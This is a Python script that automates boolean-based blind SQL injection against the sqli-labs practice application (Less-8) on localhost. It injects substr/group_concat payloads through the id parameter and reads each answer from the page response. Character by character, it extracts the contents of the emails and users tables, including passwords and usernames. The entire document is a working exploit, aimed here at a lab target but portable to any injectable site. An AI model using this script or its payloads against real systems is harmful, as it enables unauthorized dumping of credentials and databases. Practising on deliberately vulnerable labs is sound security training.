#!/usr/bin/python3
import requests
import string
tables=['emails', 'users']
columns=[['email_id', 'id'], ['id', 'password', 'username']]


url="http://localhost/sqli-labs-php7/Less-8/?id=1' and "


request=requests.Session()

def exploit(payload,url):
    data=""
    n= string.ascii_letters+string.digits+'@_%!.,'
    for num in range(200):
        for c in n:
            pl=payload.format(num,c)
            r=request.get(url+pl)
            if "You are in..........." in r.text:
                data+=c
                break
    return data.replace("#","")


payload_data="substr((select group_concat({}) from {} ),{},1)='{}' --+"
for i in range(2):
    table=str(tables[i])
    column=columns[i]
    for j in column:
        print(j,"from",table)
        j=str(j)
        p=payload_data.format(j,table,{},{})
        a=exploit(p,url)
        print(a)

            
        
        
